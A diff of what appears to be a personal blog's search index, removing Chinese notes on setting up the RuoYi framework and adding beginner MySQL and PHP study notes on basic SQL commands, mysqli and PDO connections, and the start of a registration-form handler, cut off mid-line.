@@ -24,203 +24,6 @@
       </categories>
   </entry>
   <entry>
-    <title>【RuoYi + AI】2_若伊搭建</title>
-    <url>/2024/07/07/CS_Notes/RuoYi/%E3%80%90RuoYi-+-AI%E3%80%912_%E8%8B%A5%E4%BC%8A%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h2 id="若伊搭建"><a class="header-anchor" href="#若伊搭建">¶</a>若伊搭建</h2>
-<h3 id="版本的解释"><a class="header-anchor" href="#版本的解释">¶</a>版本的解释</h3>
-<p><s><code>RuoYi</code> 前后端混合开发版本   后端Springboot  前端Bootstrap</s>  已淘汰</p>
-<p><code>RuoYi-Vue</code> 前后端分离开发版本   后端Springboot  前端Vue   单体项目√   中大型项目会有性能或扩展性的问题</p>
-<p><code>RuoYi-Cloud</code>   后端SpringCloud  前端Bootstrap   微服务版本，系统延伸性和稳定性有    做分布式微服务项目选这个</p>
-<p>以上两个提供的都是PC端，移动端的选下面APP这个版本</p>
-<p><code>RuoYi-APP</code>   后端Uniapp前端Vue  一次编写多端运行</p>
-<ul>
-<li>注意：<code>RuoYi-APP</code>没有提供后端代码，可以适配<code>RuoYi-Vue</code>和<code>RuoYi-Cloud</code></li>
-</ul>
-<p><code>RuoYi-other</code> <code>Vue3+ElementPlus+Vite</code></p>
-<h3 id="RuoYi-Vue"><a class="header-anchor" href="#RuoYi-Vue">¶</a>RuoYi-Vue</h3>
-<ul>
-<li>前后端分离的单体框架设计</li>
-<li>软件环境：JDK、MySQL、Redis、Maven、Node</li>
-</ul>
-<p>阿西吧我服了最讨厌配环境了……</p>
-<h4 id="确认版本"><a class="header-anchor" href="#确认版本">¶</a>确认版本</h4>
-<ul>
-<li>
-<p>JDK</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>
-<p>获得信息：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;java -version</span><br><span class="line">java version <span class="string">&quot;17.0.9&quot;</span> 2023-10-17 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 17.0.9+11-LTS-201)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 17.0.9+11-LTS-201, mixed mode, sharing)</span><br><span class="line"></span><br><span class="line">&gt;javac -version</span><br><span class="line">javac 17.0.9</span><br></pre></td></tr></table></figure>
-<ul>
-<li>课程版本：JDK 11</li>
-</ul>
-</li>
-<li>
-<p>MySQL</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql --version</span><br><span class="line">mysql -V   </span><br><span class="line">// 都行</span><br></pre></td></tr></table></figure>
-<ul>
-<li>服了，之前为了配小皮的环境把本地mysql给卸了，不知道要不要重装一个</li>
-<li>课程版本：MySQL 8</li>
-</ul>
-</li>
-<li>
-<p>Redis</p>
-<ul>
-<li>当Redis服务器正在运行，使用以下命令：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli info | grep redis_version</span><br></pre></td></tr></table></figure>
-<ul>
-<li>没启动就先启动Redis服务器</li>
-<li>课程版本：Redis 5（Win）</li>
-</ul>
-</li>
-<li>
-<p>Maven</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn -version</span><br></pre></td></tr></table></figure>
-<ul>
-<li>课程版本：Maven 3.6</li>
-</ul>
-</li>
-<li>
-<p>Node.js以及npm（Node的包管理器），可以使用：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm -v</span><br></pre></td></tr></table></figure>
-<ul>
-<li>获得信息：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;node -v</span><br><span class="line">v20.12.1</span><br><span class="line"></span><br><span class="line">&gt;npm -v</span><br><span class="line">10.5.0</span><br></pre></td></tr></table></figure>
-<ul>
-<li>课程版本：Node16（Vue3）</li>
-</ul>
-</li>
-</ul>
-<h4 id="技术选型"><a class="header-anchor" href="#技术选型">¶</a>技术选型</h4>
-<ul>
-<li>Spring Boot</li>
-<li>Spring Security</li>
-<li>MyBatis</li>
-<li>Jwt</li>
-<li>Vue3</li>
-<li>Element-Plus</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://gitee.com/y_project/RuoYi-Vue</span><br></pre></td></tr></table></figure>
-<p>芝士前后端分离版本的脚手架，但是其中的ruoyi-ui使用的还是Vue2版本，换成Vue3</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://gitee.com/fanxincc/RuoYi-Vue3</span><br></pre></td></tr></table></figure>
-<p>以上是Vue3扩展地址</p>
-<h2 id="搭建后端项目步骤"><a class="header-anchor" href="#搭建后端项目步骤">¶</a>搭建后端项目步骤</h2>
-<ol>
-<li>Git克隆并初始化项目</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">→ 打开IDEA </span><br><span class="line">→ 右上角Get from VCS </span><br><span class="line">→ 将仓库存储地址和url复制上去  RuoYi-Vue</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>MySQL导入与配置</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-<p><a href="https://www.bilibili.com/video/BV1pf421B71v/?p=2&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">基础篇-02.若依搭建_哔哩哔哩_bilibili</a></p>
-]]></content>
-      <categories>
-        <category>notes</category>
-        <category>RuoYi notes</category>
-      </categories>
-      <tags>
-        <tag>CS Notes</tag>
-        <tag>RuoYi</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【RuoYi + AI】1 导入部分</title>
-    <url>/2024/07/07/CS_Notes/RuoYi/%E3%80%90RuoYi-+-AI%E3%80%911_%E5%AF%BC%E5%85%A5%E9%83%A8%E5%88%86/</url>
-    <content><![CDATA[<h2 id="导入部分"><a class="header-anchor" href="#导入部分">¶</a>导入部分</h2>
-<h3 id="系统开发流程与AI局限性"><a class="header-anchor" href="#系统开发流程与AI局限性">¶</a>系统开发流程与AI局限性</h3>
-<ol>
-<li><code>项目环境搭建，技术选型，框架整合</code></li>
-<li><code>设计产品原型，例如库表、接口等</code></li>
-<li><code>前后端编码，将设计转换为实际的软件功能</code></li>
-<li><code>测试部署上线</code></li>
-</ol>
-<p>AI能完成编码部分，但是环境搭建部分还是得人工</p>
-<p>AI在设计阶段也可以起到辅助作用</p>
-<p>在测试部署阶段，AI可以辅助生成测试用例，编写部署所需要的脚本</p>
-<ul>
-<li>
-<p>若伊功能：<code>快速构建</code>  <code>通用模块</code>  <code>代码生成（尤其是对于需要重复编写的增删改查部分）</code></p>
-</li>
-<li>
-<p>若伊：基于SpringBoot+Bootstrap的极速后台开发框架</p>
-</li>
-</ul>
-<h3 id="基础应用部分"><a class="header-anchor" href="#基础应用部分">¶</a>基础应用部分</h3>
-<ul>
-<li>若伊搭建</li>
-<li>入门案例</li>
-<li>功能详解</li>
-<li>项目结构</li>
-<li>源码阅读</li>
-<li>二次开发</li>
-<li>通义灵码AI工具</li>
-</ul>
-<h3 id="项目实战部分"><a class="header-anchor" href="#项目实战部分">¶</a>项目实战部分</h3>
-<ul>
-<li>帝可得-项目搭建</li>
-<li>帝可得-前端页面</li>
-<li>帝可得-点位管理</li>
-<li>帝可得-人员管理</li>
-<li>帝可得-设备管理</li>
-<li>AI优化代码</li>
-<li>AI生成代码</li>
-<li>AI代码调错</li>
-</ul>
-<h3 id="拔高原理部分"><a class="header-anchor" href="#拔高原理部分">¶</a>拔高原理部分</h3>
-<ul>
-<li>若伊框架的核心原理和底层运行机制分析</li>
-<li>Velocity代码生成器</li>
-<li>RBAC权限控制</li>
-<li>异步任务管理器</li>
-<li>自定义日志注解</li>
-<li>AI生成注释</li>
-<li>AI辅助阅读</li>
-</ul>
-<h3 id="前置知识"><a class="header-anchor" href="#前置知识">¶</a>前置知识</h3>
-<ul>
-<li>关系型数据库 MySQL</li>
-<li>非关系型数据库Redis</li>
-<li>后端
-<ul>
-<li>Springboot</li>
-<li>MyBatis</li>
-</ul>
-</li>
-<li>前端
-<ul>
-<li>Vue3</li>
-<li>Axios</li>
-<li>Element-Plus</li>
-</ul>
-</li>
-<li>工具
-<ul>
-<li>IDEA、VSCode</li>
-<li>Git</li>
-</ul>
-</li>
-<li>AI+若伊
-<ul>
-<li>全栈开发</li>
-</ul>
-</li>
-</ul>
-<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
-<p>以后真的全栈3k吧hhhhhh</p>
-]]></content>
-      <categories>
-        <category>notes</category>
-        <category>RuoYi notes</category>
-      </categories>
-      <tags>
-        <tag>CS Notes</tag>
-        <tag>RuoYi</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CS186 SQL1 Berkeley</title>
     <url>/2024/07/04/CS_Notes/Database/CS186%20SQL1/</url>
     <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
@@ -1038,6 +841,244 @@ WHERE rating &gt; 8;
       <tags>
         <tag>CS Notes</tag>
         <tag>Database</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL复习</title>
+    <url>/2024/07/11/CS_Notes/Database/PHP+MySQL_note_and_practice/</url>
+    <content><![CDATA[<h2 id="xp-cn下的MySQL"><a class="header-anchor" href="#xp-cn下的MySQL">¶</a>xp.cn下的MySQL</h2>
+<p>本地的MySQL之前被卸载了，为了不跟小皮的冲突</p>
+<p>访问xp.cn的MySQL路径：<code>phpstudy_pro\Extensions\MySQL5.7.26\bin</code></p>
+<p>在当前路径下访问cmd</p>
+<p><code>mysql -uroot -p</code>     密码可见小皮界面的数据库模块</p>
+<p><code>show databases;</code> 查看所有库</p>
+<p><code>use database_name;</code> 使用某个库</p>
+<p><code>show tables;</code>  显示当前库中所有的表</p>
+<p><code>select * from table_name;</code>  显示当前库中某表的所有内容</p>
+<h2 id="创建数据库与表，插入数据"><a class="header-anchor" href="#创建数据库与表，插入数据">¶</a>创建数据库与表，插入数据</h2>
+<h4 id="数据库的整体结构："><a class="header-anchor" href="#数据库的整体结构：">¶</a><strong>数据库的整体结构：</strong></h4>
+<ul>
+<li>电脑（服务器）-&gt;数据库软件（mysql、mssql、甲骨文、mariadb…）-&gt;数据库-&gt; 表-&gt;字段</li>
+</ul>
+<h4 id="数据库进入方法："><a class="header-anchor" href="#数据库进入方法：">¶</a><strong>数据库进入方法：</strong></h4>
+<p>​	1、直接进入</p>
+<p>​	2、使用软件连接</p>
+<p>​	3、使用phpmyadmin //注意，PHP版本要高于7.0才可以直接使用</p>
+<p>​	进入sql代码，在mysql的bin路径输入</p>
+<p>​	<code>.\mysql.exe -h 127.0.0.1 -u root -p</code></p>
+<h4 id="数据库操纵语句"><a class="header-anchor" href="#数据库操纵语句">¶</a><strong>数据库操纵语句</strong></h4>
+<ul>
+<li>
+<p>查询MySQL内的数据库</p>
+<ul>
+<li>show databases;`</li>
+</ul>
+</li>
+<li>
+<p>创建库</p>
+<ul>
+<li>create database kkk;`</li>
+</ul>
+</li>
+<li>
+<p>删除库</p>
+<ul>
+<li>drop database kkk;`</li>
+</ul>
+</li>
+<li>
+<p>创建表，之前需要先构思好表单的结构，然后创建每个表的属性</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>user</th>
+<th>pass</th>
+<th>phone</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>admin</td>
+<td>123456</td>
+<td>13800000000</td>
+</tr>
+<tr>
+<td>自增数字</td>
+<td>字符串</td>
+<td>字符串</td>
+<td>数字</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use kkk; //进入库</span><br><span class="line">//创建kkk_tbl表</span><br><span class="line">CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span><br><span class="line">`id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">`user` VARCHAR(10) NOT NULL,</span><br><span class="line">`pass` VARCHAR(10) NOT NULL,</span><br><span class="line">`phone` INT(11) NOT NULL,</span><br><span class="line">PRIMARY KEY ( `id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>NOT NULL - 每一行都必须含有值（不能为空），null 值是不允许的。</p>
+</li>
+<li>
+<p>DEFAULT value - 设置默认值</p>
+</li>
+<li>
+<p>UNSIGNED - 使用无符号数值类型，0 及正数</p>
+</li>
+<li>
+<p>AUTO INCREMENT - 设置 MySQL 字段的值在新增记录时每次自动增长 1</p>
+</li>
+<li>
+<p>PRIMARY KEY - 设置数据表中每条记录的唯一标识。 通常列的PRIMARY KEY 设置为 ID 数值，与 AUTO_INCREMENT 一起使用。</p>
+</li>
+</ul>
+<h4 id="查看表的框架"><a class="header-anchor" href="#查看表的框架">¶</a>查看表的框架</h4>
+<p><code>desc kkk_tbl;</code></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-------+------------------+------+-----+---------+----------------+ | Field | Type | Null | Key |</span></span><br><span class="line"><span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span> <span class="operator">+</span><span class="comment">-------+------------------+------+-----+---------+----------------+ | id | int(10)</span></span><br><span class="line">unsigned <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> auto_increment <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">user</span> <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">10</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">|</span> pass <span class="operator">|</span></span><br><span class="line"><span class="type">varchar</span>(<span class="number">10</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">|</span> phone <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">+</span><span class="comment">-------+------------------+------+--</span></span><br><span class="line"><span class="comment">---+---------+----------------+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>增加数据</p>
+<ul>
+<li><code>insert into kkk_tbl(user,pass,phone) values('admin','123456','1380000000');</code></li>
+</ul>
+</li>
+<li>
+<p>删除数据</p>
+<ul>
+<li><code>delete from kkk_tbl where user=&quot;admin&quot;;</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="PHP联动MySQL"><a class="header-anchor" href="#PHP联动MySQL">¶</a>PHP联动MySQL</h2>
+<ul>
+<li>PHP创建数据库</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 面向过程</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDB&quot;</span>;  <span class="comment">// 数据库名为myDB</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>连接数据</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>其他需要调用该文件的php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;create DATABASE myDaB&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>面向对象的</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDB&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用PDO</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> 		<span class="title function_ invoke__">PDO</span>(<span class="string">&quot;mysql:host=<span class="subst">$servername</span>&quot;</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">	<span class="comment">// 设置 PDO 错误模式为异常</span></span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, 	PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDBPDO&quot;</span>;</span><br><span class="line"><span class="comment">// 使用 exec() ，因为没有结果返回</span></span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span> = <span class="literal">null</span>;  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>创建表（面对过程）</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需要设置进去的库</span></span><br><span class="line">conn.php 文件 新增</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;myDB&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>生成表内基本框架</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">`id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">`user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">`pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">`phone` INT(11) NOT NULL,</span></span><br><span class="line"><span class="string">PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">)ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;创建数据表错误: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="注册界面任务分解"><a class="header-anchor" href="#注册界面任务分解">¶</a>注册界面任务分解</h2>
+<h4 id="网站注册界面-网站首页"><a class="header-anchor" href="#网站注册界面-网站首页">¶</a>网站注册界面/网站首页</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $name,$password1,$password2,$shouji,$tupian; 输出验证</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$password1</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$password2</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line"><span class="variable">$ERR</span>=<span class="string">&quot;账号密码、手机号码不能为空&quot;</span>;</span><br><span class="line"><span class="comment">//密码长度8位,密码两次输入一致</span></span><br><span class="line"><span class="comment">//密码验证</span></span><br><span class="line"><span class="comment">//手机11位</span></span><br><span class="line"><span class="comment">//文件上传jpg</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;密码长度不足八位&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;两次输入密码不一致&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="string">&quot;11&quot;</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;手机号码格式有问题&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span 